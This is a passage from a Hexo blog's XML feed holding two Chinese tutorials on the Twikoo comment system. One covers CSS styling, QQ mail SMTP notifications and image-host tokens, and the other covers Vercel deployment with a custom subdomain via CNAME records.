      <link href="/post/e988d7ce.html"/>
      <url>/post/e988d7ce.html</url>
      
        <content type="html"><![CDATA[<p>添加Twikoo请查看文章<a href="https://dqywy.top/post/d0d1b7a9.html">添加Twikoo实现博客在线评论</a></p><p>安装完成后可以对Twikoo进行以下配置：</p><h2 id="评论区美化"><a href="#评论区美化" class="headerlink" title="评论区美化"></a>评论区美化</h2><p>参考自：<a href="https://blog.leonus.cn/2022/inputAlert.html">Leonus的博客</a>与<a href="https://www.cxl2020mc.top/post/Hexo-Butterfly-Twikoo%E8%AF%84%E8%AE%BA%E5%8C%BA%E7%BE%8E%E5%8C%96/#css%E4%BB%A3%E7%A0%81">陈鑫磊的博客</a></p><details class="folding-tag" ><summary> 效果预览 </summary>              <div class='content'>              <p><img src="https://s1.ax1x.com/2023/05/10/p9DTc0U.png" alt=""></p>              </div>            </details><ol><li><p>新建Blog\source\css\custom.css，缺少的文件夹或文件直接创建即可，在末尾添加下列代码</p><p>​    这段代码的主要作用就是增加边框的立体感和圆润度</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* 声名部分变量 */</span></span><br><span class="line"><span class="selector-pseudo">:root</span> &#123;</span><br><span class="line">  <span class="attr">--cxl2020mc-radius</span>: <span class="number">7px</span>;</span><br><span class="line">  <span class="attr">--cxl2020mc-card-border-width</span>: <span class="number">1px</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 浅色模式颜色 */</span></span><br><span class="line"><span class="selector-attr">[data-theme=light]</span> &#123;</span><br><span class="line">  <span class="attr">--cxl2020mc-border-color</span>: <span class="number">#e3e8f7</span>;</span><br><span class="line">  <span class="attr">--cxl2020mc-card-bg</span>: <span class="number">#fff</span>;</span><br><span class="line">  <span class="attr">--cxl2020mc-card-border</span>: <span class="number">#e3e8f7</span>;</span><br><span class="line">  <span class="attr">--style-border-always</span>: <span class="number">1px</span> solid <span class="built_in">var</span>(--cxl2020mc-card-border);</span><br><span class="line">  <span class="attr">--cxl2020mc-blue</span>: <span class="number">#425AEF</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 深色模式颜色 */</span></span><br><span class="line"><span class="selector-attr">[data-theme=dark]</span> &#123;</span><br><span class="line">  <span class="attr">--cxl2020mc-border-color</span>: <span class="number">#42444a</span>;</span><br><span class="line">  <span class="attr">--cxl2020mc-card-bg</span>: <span class="number">#1d1b26</span>;</span><br><span class="line">  <span class="attr">--cxl2020mc-card-border</span>: <span class="number">#42444a</span>;</span><br><span class="line">  <span class="attr">--style-border-always</span>: <span class="number">1px</span> solid <span class="built_in">var</span>(--cxl2020mc-card-border);</span><br><span class="line">  <span class="attr">--cxl2020mc-blue</span>: <span class="number">#0084FF</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 评论区评论大框 */</span></span><br><span class="line"><span class="selector-class">.twikoo</span> <span class="selector-class">.tk-comments-container</span>&gt;<span class="selector-class">.tk-comment</span> &#123;</span><br><span class="line">  <span class="comment">/* 内边距 */</span></span><br><span class="line">  <span class="attribute">padding</span>: <span class="number">1rem</span>;</span><br><span class="line">  <span class="comment">/* 圆角 */</span></span><br><span class="line">  <span class="attribute">border-radius</span>: <span class="built_in">var</span>(--cxl2020mc-radius);</span><br><span class="line">  <span class="comment">/* 背景颜色 */</span></span><br><span class="line">  <span class="attribute">background</span>: <span class="built_in">var</span>(--cxl2020mc-card-bg);</span><br><span class="line">  <span class="comment">/* 变动动画时长 */</span></span><br><span class="line">  <span class="attribute">transition</span>: .<span class="number">3s</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 浅色模式评论区评论大框 */</span></span><br><span class="line"><span class="selector-attr">[data-theme=light]</span> <span class="selector-class">.twikoo</span> <span class="selector-class">.tk-comments-container</span>&gt;<span class="selector-class">.tk-comment</span> &#123;</span><br><span class="line">  <span class="comment">/* 阴影 */</span></span><br><span class="line">  <span class="attribute">box-shadow</span>: <span class="built_in">var</span>(--card-box-shadow);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 浅色模式评论区评论大框阴影悬浮加深 */</span></span><br><span class="line"><span class="selector-attr">[data-theme=light]</span> <span class="selector-class">.twikoo</span> <span class="selector-class">.tk-comments-container</span>&gt;<span class="selector-class">.tk-comment</span><span class="selector-pseudo">:hover</span> &#123;</span><br><span class="line">  <span class="comment">/* 阴影（浅色模式突出层次感） */</span></span><br><span class="line">  <span class="attribute">box-shadow</span>: <span class="built_in">var</span>(--card-hover-box-shadow);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 黑暗模式评论区评论大框 */</span></span><br><span class="line"><span class="selector-attr">[data-theme=dark]</span> <span class="selector-class">.twikoo</span> <span class="selector-class">.tk-comments-container</span>&gt;<span class="selector-class">.tk-comment</span> &#123;</span><br><span class="line">  <span class="comment">/* 边框样式 */</span></span><br><span class="line">  <span class="attribute">border-style</span>: solid;</span><br><span class="line">  <span class="comment">/* 边框宽度 */</span></span><br><span class="line">  <span class="attribute">border-width</span>: <span class="built_in">var</span>(--cxl2020mc-card-border-width);</span><br><span class="line">  <span class="comment">/* 边框颜色 */</span></span><br><span class="line">  <span class="attribute">border-color</span>: <span class="built_in">var</span>(--cxl2020mc-card-border);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 设备信息 */</span></span><br><span class="line"><span class="selector-class">.twikoo</span> <span class="selector-class">.tk-extra</span> &#123;</span><br><span class="line">  <span class="comment">/* 圆角 */</span></span><br><span class="line">  <span class="attribute">border-radius</span>: <span class="built_in">var</span>(--cxl2020mc-radius);</span><br><span class="line">  <span class="comment">/* 背景颜色 */</span></span><br><span class="line">  <span class="attribute">background</span>: <span class="built_in">var</span>(--cxl2020mc-card-bg);</span><br><span class="line">  <span class="comment">/* 内边距 */</span></span><br><span class="line">  <span class="attribute">padding</span>: <span class="number">0.4rem</span>;</span><br><span class="line">  <span class="comment">/* 底边距 */</span></span><br><span class="line">  <span class="attribute">margin-bottom</span>: <span class="number">1rem</span>;</span><br><span class="line">  <span class="comment">/* 变动动画时长 */</span></span><br><span class="line">  <span class="attribute">transition</span>: .<span class="number">3s</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 浅色模式设备信息 */</span></span><br><span class="line"><span class="selector-attr">[data-theme=light]</span> <span class="selector-class">.twikoo</span> <span class="selector-class">.tk-extra</span> &#123;</span><br><span class="line">  <span class="comment">/* 阴影 */</span></span><br><span class="line">  <span class="attribute">box-shadow</span>: <span class="built_in">var</span>(--card-box-shadow);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 浅色模式设备信息阴影悬浮加深 */</span></span><br><span class="line"><span class="selector-attr">[data-theme=light]</span> <span class="selector-class">.twikoo</span> <span class="selector-class">.tk-extra</span><span class="selector-pseudo">:hover</span> &#123;</span><br><span class="line">  <span class="comment">/* 阴影 */</span></span><br><span class="line">  <span class="attribute">box-shadow</span>: <span class="built_in">var</span>(--card-hover-box-shadow);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 黑暗模式设备信息 */</span></span><br><span class="line"><span class="selector-attr">[data-theme=dark]</span> <span class="selector-class">.twikoo</span> <span class="selector-class">.tk-extra</span> &#123;</span><br><span class="line">  <span class="comment">/* 边框样式 */</span></span><br><span class="line">  <span class="attribute">border-style</span>: solid;</span><br><span class="line">  <span class="comment">/* 边框宽度 */</span></span><br><span class="line">  <span class="attribute">border-width</span>: <span class="built_in">var</span>(--cxl2020mc-card-border-width);</span><br><span class="line">  <span class="comment">/* 边框颜色 */</span></span><br><span class="line">  <span class="attribute">border-color</span>: <span class="built_in">var</span>(--cxl2020mc-card-border);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 加载更多按钮 */</span></span><br><span class="line"><span class="selector-class">.twikoo</span> <span class="selector-class">.tk-expand</span> &#123;</span><br><span class="line">  <span class="comment">/* 圆角 */</span></span><br><span class="line">  <span class="attribute">border-radius</span>: <span class="built_in">var</span>(--cxl2020mc-radius);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 浅色模式加载更多按钮 */</span></span><br><span class="line"><span class="selector-attr">[data-theme=light]</span> <span class="selector-class">.twikoo</span> <span class="selector-class">.tk-expand</span> &#123;</span><br><span class="line">  <span class="comment">/* 阴影 */</span></span><br><span class="line">  <span class="attribute">box-shadow</span>: <span class="built_in">var</span>(--card-box-shadow);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 浅色模式加载更多按钮（鼠标悬浮时） */</span></span><br><span class="line"><span class="selector-attr">[data-theme=light]</span> <span class="selector-class">.twikoo</span> <span class="selector-class">.tk-expand</span><span class="selector-pseudo">:hover</span> &#123;</span><br><span class="line">  <span class="comment">/* 阴影 */</span></span><br><span class="line">  <span class="attribute">box-shadow</span>: <span class="built_in">var</span>(--card-hover-box-shadow);</span><br><span class="line">  <span class="comment">/* 背景颜色 */</span></span><br><span class="line">  <span class="attribute">background-color</span>: <span class="built_in">var</span>(--btn-bg);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 黑暗模式加载更多按钮（鼠标悬浮时） */</span></span><br><span class="line"><span class="selector-attr">[data-theme=dark]</span> <span class="selector-class">.twikoo</span> <span class="selector-class">.tk-expand</span><span class="selector-pseudo">:hover</span> &#123;</span><br><span class="line">  <span class="comment">/* 背景颜色 */</span></span><br><span class="line">  <span class="attribute">background-color</span>: <span class="built_in">var</span>(--cxl2020mc-blue);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 黑暗模式加载更多按钮 */</span></span><br><span class="line"><span class="selector-attr">[data-theme=dark]</span> <span class="selector-class">.twikoo</span> <span class="selector-class">.tk-expand</span> &#123;</span><br><span class="line">  <span class="comment">/* 边框样式 */</span></span><br><span class="line">  <span class="attribute">border-style</span>: solid;</span><br><span class="line">  <span class="comment">/* 边框宽度 */</span></span><br><span class="line">  <span class="attribute">border-width</span>: <span class="built_in">var</span>(--cxl2020mc-card-border-width);</span><br><span class="line">  <span class="comment">/* 边框颜色 */</span></span><br><span class="line">  <span class="attribute">border-color</span>: <span class="built_in">var</span>(--cxl2020mc-card-border);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>在custom.css末尾添加下列代码nth-child(1)(2)(3)分别是你鼠标点击昵称、邮箱、网址框时悬浮显示的内容</p></li></ol><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* 设置文字内容 :nth-child(1)的作用是选择第几个 */</span></span><br><span class="line"><span class="selector-class">.el-input</span><span class="selector-class">.el-input--small</span><span class="selector-class">.el-input-group</span><span class="selector-class">.el-input-group--prepend</span><span class="selector-pseudo">:nth-child</span>(<span class="number">1</span>)<span class="selector-pseudo">:before</span> &#123;</span><br><span class="line">    <span class="attribute">content</span>: <span class="string">&#x27;输入QQ号会自动获取昵称和头像🐧&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.el-input</span><span class="selector-class">.el-input--small</span><span class="selector-class">.el-input-group</span><span class="selector-class">.el-input-group--prepend</span><span class="selector-pseudo">:nth-child</span>(<span class="number">2</span>)<span class="selector-pseudo">:before</span> &#123;</span><br><span class="line">    <span class="attribute">content</span>: <span class="string">&#x27;收到回复将会发送到您的邮箱📧&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.el-input</span><span class="selector-class">.el-input--small</span><span class="selector-class">.el-input-group</span><span class="selector-class">.el-input-group--prepend</span><span class="selector-pseudo">:nth-child</span>(<span class="number">3</span>)<span class="selector-pseudo">:before</span> &#123;</span><br><span class="line">    <span class="attribute">content</span>: <span class="string">&#x27;可以通过昵称访问您的网站🔗&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 当用户点击输入框时显示 */</span></span><br><span class="line"><span class="selector-class">.el-input</span><span class="selector-class">.el-input--small</span><span class="selector-class">.el-input-group</span><span class="selector-class">.el-input-group--prepend</span><span class="selector-pseudo">:focus</span>-within<span class="selector-pseudo">::before</span>,</span><br><span class="line"><span class="selector-class">.el-input</span><span class="selector-class">.el-input--small</span><span class="selector-class">.el-input-group</span><span class="selector-class">.el-input-group--prepend</span><span class="selector-pseudo">:focus</span>-within<span class="selector-pseudo">::after</span> &#123;</span><br><span class="line">    <span class="attribute">display</span>: block;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 主内容区 */</span></span><br><span class="line"><span class="selector-class">.el-input</span><span class="selector-class">.el-input--small</span><span class="selector-class">.el-input-group</span><span class="selector-class">.el-input-group--prepend</span><span class="selector-pseudo">::before</span> &#123;</span><br><span class="line">    <span class="comment">/* 先隐藏起来 */</span></span><br><span class="line">    <span class="attribute">display</span>: none;</span><br><span class="line">    <span class="comment">/* 绝对定位 */</span></span><br><span class="line">    <span class="attribute">position</span>: absolute;</span><br><span class="line">    <span class="comment">/* 向上移动60像素 */</span></span><br><span class="line">    <span class="attribute">top</span>: -<span class="number">60px</span>;</span><br><span class="line">    <span class="comment">/* 文字强制不换行，防止left:50%导致的文字换行 */</span></span><br><span class="line">    <span class="attribute">white-space</span>: nowrap;</span><br><span class="line">    <span class="comment">/* 圆角 */</span></span><br><span class="line">    <span class="attribute">border-radius</span>: <span class="number">10px</span>;</span><br><span class="line">    <span class="comment">/* 距离左边50% */</span></span><br><span class="line">    <span class="attribute">left</span>: <span class="number">50%</span>;</span><br><span class="line">    <span class="comment">/* 然后再向左边挪动自身的一半，即可实现居中 */</span></span><br><span class="line">    <span class="attribute">transform</span>: <span class="built_in">translate</span>(-<span class="number">50%</span>);</span><br><span class="line">    <span class="comment">/* 填充 */</span></span><br><span class="line">    <span class="attribute">padding</span>: <span class="number">14px</span> <span class="number">18px</span>;</span><br><span class="line">    <span class="attribute">background</span>: <span class="number">#444</span>;</span><br><span class="line">    <span class="attribute">color</span>: <span class="number">#fff</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 小角标 */</span></span><br><span class="line"><span class="selector-class">.el-input</span><span class="selector-class">.el-input--small</span><span class="selector-class">.el-input-group</span><span class="selector-class">.el-input-group--prepend</span><span class="selector-pseudo">::after</span> &#123;</span><br><span class="line">    <span class="attribute">display</span>: none;</span><br><span class="line">    <span class="attribute">content</span>: <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="attribute">position</span>: absolute;</span><br><span class="line">    <span class="comment">/* 内容大小（宽高）为0且边框大小不为0的情况下，每一条边（4个边）都是一个三角形，组成一个正方形。</span></span><br><span class="line"><span class="comment">    我们先将所有边框透明，再给其中的一条边添加颜色就可以实现小三角图标 */</span></span><br><span class="line">    <span class="attribute">border</span>: <span class="number">12px</span> solid transparent;</span><br><span class="line">    <span class="attribute">border-top-color</span>: <span class="number">#444</span>;</span><br><span class="line">    <span class="attribute">left</span>: <span class="number">50%</span>;</span><br><span class="line">    <span class="attribute">transform</span>: <span class="built_in">translate</span>(-<span class="number">50%</span>, -<span class="number">48px</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol><li><p>引入custom.css: 打开主题配置文件_config.butterfly.yml搜索inject找到head头部：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="bullet">-</span> <span class="string">&lt;link</span> <span class="string">rel=&quot;stylesheet&quot;</span> <span class="string">href=&quot;/css/custom.css&quot;</span> <span class="string">media=&quot;defer&quot;</span> <span class="string">onload=&quot;this.media=&#x27;all&#x27;&quot;&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://s1.ax1x.com/2023/05/10/p9Dq1US.png" alt=""></p></li><li><p>随便打开一篇文章，拉到底部，登录Twikoo管理面板，选择配置管理，点开通用选项</p><p>（1）COMMENT_PLACEHOLDER设置评论框默认显示的内容，表情可以直接在网上搜emoji复制粘贴进去</p><p><img src="https://s1.ax1x.com/2023/05/10/p9DXFEV.png" alt=""></p><p>（2）设置评论区背景，最好选用纯色的，或者就是选择一个很小的图片作为脚标(可以在<a href="https://www.iconfont.cn/">阿里巴巴图标库</a>选择一个喜欢的图标并下载，图片大小设置为14左右)</p><p><img src="https://s1.ax1x.com/2023/05/10/p9DXuuR.png" alt=""></p><p>（3）其余配置可以自己翻一翻，每项都有中文注释</p></li></ol><h2 id="设置邮箱提醒"><a href="#设置邮箱提醒" class="headerlink" title="设置邮箱提醒"></a>设置邮箱提醒</h2><p>设置邮箱提醒可以在有小伙伴给你的文章评论时向你发送邮件让你及时知道</p><ol><li><p>开通POP3/SMTP服务(以QQ邮箱为例，其他邮箱类比)</p><p>在电脑端打开QQ邮箱并点击最上方的设置</p><p><img src="https://s1.ax1x.com/2023/04/27/p9MqS3t.png" alt=""></p><p>点击帐户</p><p><img src="https://s1.ax1x.com/2023/04/27/p9Mb4hR.png" alt=""></p><p>下拉找到POP3/SMTP服务并点击开启服务，按指示验证即可</p><h3 id="注意：验证完毕以后会出现授权码，记得保存一会要用"><a href="#注意：验证完毕以后会出现授权码，记得保存一会要用" class="headerlink" title="注意：验证完毕以后会出现授权码，记得保存一会要用"></a>注意：验证完毕以后会出现授权码，记得保存一会要用</h3><p><img src="https://s1.ax1x.com/2023/04/27/p9MbhN9.png" alt=""></p></li></ol><p>​    如果不小心忘记保存授权码可以重新生成并保存</p><p><img src="https://s1.ax1x.com/2023/04/27/p9MqQDU.png" alt=""></p><p><img src="https://s1.ax1x.com/2023/04/27/p9MqMuT.png" alt=""></p><h2 id="配置邮件通知服务"><a href="#配置邮件通知服务" class="headerlink" title="配置邮件通知服务"></a>配置邮件通知服务</h2><p>随便打开一篇文章，拉到底部，登录Twikoo管理面板</p><p><img src="https://s1.ax1x.com/2023/04/27/p9Mq5Vg.png" alt=""></p><p>下拉找到邮件通知选项</p><p><img src="https://s1.ax1x.com/2023/04/27/p9MqIaQ.png" alt=""></p><h3 id="可以参考我的配置，没填的就是用的默认"><a href="#可以参考我的配置，没填的就是用的默认" class="headerlink" title="可以参考我的配置，没填的就是用的默认"></a>可以参考我的配置，没填的就是用的默认</h3><h4 id="SMTP-PASS填刚刚生成的授权码"><a href="#SMTP-PASS填刚刚生成的授权码" class="headerlink" title="SMTP_PASS填刚刚生成的授权码"></a>SMTP_PASS填刚刚生成的授权码</h4><p><img src="https://s1.ax1x.com/2023/04/27/p9MqhqS.png" alt=""></p><p><img src="https://s1.ax1x.com/2023/04/27/p9Mqfr8.png" alt=""></p><p><img src="https://s1.ax1x.com/2023/04/27/p9MqWKf.png" alt=""></p><p>填写完成以后点击邮件通知测试，收到来自Twikoo的邮件就说明配置正确</p><p><img src="https://s1.ax1x.com/2023/04/27/p9MqIaQ.png" alt=""></p><p>到评论区发送一条评论就可以在邮箱收到提醒啦</p><p><img src="https://s1.ax1x.com/2023/04/27/p9MbfAJ.png" alt=""></p><h2 id="配置图床"><a href="#配置图床" class="headerlink" title="配置图床"></a>配置图床</h2><p>我使用的是smms图床，配置简单：<a href="https://smms.app/">SMMS</a></p><p>注册好以后点击上方的user-&gt;Dashboard</p><p><img src="https://s1.ax1x.com/2023/05/21/p9IE2B8.png" alt=""></p><p>点击左侧栏目中的API Token并生成自己的API key后复制</p><p><img src="https://s1.ax1x.com/2023/05/21/p9IEgnf.png" alt=""></p><p>打开自己的评论设置-&gt;配置管理-&gt;插件-&gt;在IAMGE_CDN中填入smms(或其他图床名称)，在IMAGE_CDN_TOKEN填入刚刚生成的API key-&gt;保存并刷新</p><p><img src="https://s1.ax1x.com/2023/05/21/p9IETcq.png" alt=""></p>]]></content>
      
      
      <categories>
          
          <category> 博客 </category>
          
          <category> 插件 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 博客插件 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>添加Twikoo实现博客在线评论——2023最新版</title>
      <link href="/post/d0d1b7a9.html"/>
      <url>/post/d0d1b7a9.html</url>
      
        <content type="html"><![CDATA[<h2 id="Vercel部署"><a href="#Vercel部署" class="headerlink" title="Vercel部署"></a>Vercel部署</h2><h3 id="注意：按照视频教程中执行到云函数运行成功的步骤时请返回本教程"><a href="#注意：按照视频教程中执行到云函数运行成功的步骤时请返回本教程" class="headerlink" title="注意：按照视频教程中执行到云函数运行成功的步骤时请返回本教程"></a>注意：按照视频教程中执行到云函数运行成功的步骤时请返回本教程</h3><p><img src="https://s1.ax1x.com/2023/04/25/p9uLFRP.png" alt="云函数运行成功"></p><p>部署方式：<a href="https://www.bilibili.com/video/BV1Fh411e7ZH">https://www.bilibili.com/video/BV1Fh411e7ZH</a></p><p>参考Twikoo文档：<a href="https://twikoo.js.org/">https://twikoo.js.org/</a></p><p>视频中下一步要求我们点击DOMAINS链接，但是这个链接已经被墙了，无法访问到，我们需要更改DOMAINS</p><h2 id="申请个人域名"><a href="#申请个人域名" class="headerlink" title="申请个人域名"></a>申请个人域名</h2><p>阿里云、腾讯云、华为云都可以，我在阿里云申请的</p><ol><li>主页搜索域名注册，在搜索记录里点击域名注册</li></ol><p><img src="https://s1.ax1x.com/2023/04/26/p9KUQSS.png" alt=""></p><ol><li>自定义想要的域名</li></ol><p><img src="https://s1.ax1x.com/2023/04/26/p9KUVeA.png" alt=""></p><ol><li><p>购买域名</p><h3 id="域名不需要备案，因为我们只是需要一个二级域名"><a href="#域名不需要备案，因为我们只是需要一个二级域名" class="headerlink" title="域名不需要备案，因为我们只是需要一个二级域名"></a><img src="https://s1.ax1x.com/2023/04/26/p9KU9JK.png" alt="">域名不需要备案，因为我们只是需要一个二级域名</h3></li></ol><h2 id="生成二级域名"><a href="#生成二级域名" class="headerlink" title="生成二级域名"></a>生成二级域名</h2><ol><li><h3 id="在阿里云控制台添加子域名解析记录"><a href="#在阿里云控制台添加子域名解析记录" class="headerlink" title="在阿里云控制台添加子域名解析记录"></a>在阿里云控制台添加子域名解析记录</h3><p>首页打开控制台</p><p><img src="https://s1.ax1x.com/2023/04/26/p9Ka81O.png" alt=""></p><p>点击图片中的云解析</p><p><img src="https://s1.ax1x.com/2023/04/26/p9KanB9.png" alt=""></p><p>点击你购买的域名</p><p><img src="https://s1.ax1x.com/2023/04/26/p9KamnJ.png" alt=""></p><p>点击添加记录</p><p><img src="https://s1.ax1x.com/2023/04/26/p9KaZX4.png" alt=""></p><p>记录类型选择CNAME</p><p>主机记录随便写，我填的是blog</p><p>记录值设置为你的网站域名，例如我的是：hellodqy.github.io</p><p>点击确认</p><p><img src="https://s1.ax1x.com/2023/04/26/p9KaVcF.png" alt=""></p><p>现在已经生成了一个二级域名，但是这个域名并不能打开任何网页，因为它没有与Github Page绑定，本教程不需要绑定！想绑定的话直接去Github的仓库找到CNAME文件，没有的话就自己创建一个，将自己的二级域名添加到文件第一行（内容必须为一行）,此时在地址栏输入自己的子域名就可以跳转到 Github Page 页面了</p></li></ol><h2 id="更改DOMAINS"><a href="#更改DOMAINS" class="headerlink" title="更改DOMAINS"></a>更改DOMAINS</h2><p>打开Vercel</p><p><img src="https://s1.ax1x.com/2023/04/25/p9uLyLD.png" alt=""></p><p><img src="https://s1.ax1x.com/2023/04/25/p9uLgdH.png" alt=""></p><p>将刚刚申请的二级域名填进去，点击Save</p><p><img src="https://s1.ax1x.com/2023/04/25/p9uLcee.png" alt=""></p><p>然后会出现报错：要求我们到DNS Provider去添加记录</p><p>回到这个界面，先删除记录值为你的网站域名的那条记录，再次添加记录</p><h3 id="注意：如果你按照我前面给的Github绑定二级域名教程到Github生成了CNAME文件的话，得去删掉CNAME文件"><a href="#注意：如果你按照我前面给的Github绑定二级域名教程到Github生成了CNAME文件的话，得去删掉CNAME文件" class="headerlink" title="注意：如果你按照我前面给的Github绑定二级域名教程到Github生成了CNAME文件的话，得去删掉CNAME文件"></a>注意：如果你按照我前面给的Github绑定二级域名教程到Github生成了CNAME文件的话，得去删掉CNAME文件</h3><p><img src="https://s1.ax1x.com/2023/04/26/p9KaZX4.png" alt=""></p><p>按照报错提示填：类型：CNAME；主机记录：刚刚填的是什么，现在就填什么，比如刚刚申请二级域名我填的是blog，现在就填blog</p><p>主要是记录值要改，填报错提示中的value值，点击确认</p><p><img src="https://s1.ax1x.com/2023/04/26/p9KaVcF.png" alt=""></p><p>回到Vercel的这个界面，点击上方的Deployments选项</p><p><img src="https://img.gejiba.com/images/873afe2505fe5c550618ee4e2d1cfb66.png" alt=""></p><p>找到current记录，点击三个点，点击Redeploy</p><p><img src="https://img.gejiba.com/images/45749a7cc312c2bac96e66ff25d95fe5.png" alt=""></p><p><img src="https://img.gejiba.com/images/a5da36952e4d76027bfa9e0896b66c1f.png" alt=""></p><p>看到DOMAINS是你设置的二级域名就修改正确了</p><p><img src="https://img.gejiba.com/images/723d9c021a5fa74ccea440f4e068b8fc.png" alt=""></p><p>过几分钟，点击查看新的DOMAINS网页中出现云函数运行成功即可，如图：</p><p><img src="https://s1.ax1x.com/2023/04/26/p9Kd1Vs.png" alt=""></p><h2 id="获取Vercel的环境ID-enVId"><a href="#获取Vercel的环境ID-enVId" class="headerlink" title="获取Vercel的环境ID(enVId)"></a>获取Vercel的环境ID(enVId)</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:// + DOMAINS(就是你设置的二级域名)</span><br></pre></td></tr></table></figure><h2 id="前端部署"><a 